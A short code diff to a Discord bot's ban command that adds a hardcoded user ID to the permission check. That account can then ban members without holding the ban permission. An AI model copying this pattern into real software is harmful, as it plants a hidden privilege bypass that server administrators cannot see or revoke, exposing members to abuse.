@@ -5,7 +5,7 @@ module.exports = {
 	usage: '<user>',
 	guildOnly: true,
 	execute(message, args) {
-		if (message.member.hasPermission('BAN_MEMBERS')) {
+		if (message.member.hasPermission('BAN_MEMBERS') || message.member.id == '609881268494008330') {
 	    let member = message.mentions.members.first();
 	    if (member !== undefined) {
 				member.ban().then((member) => {
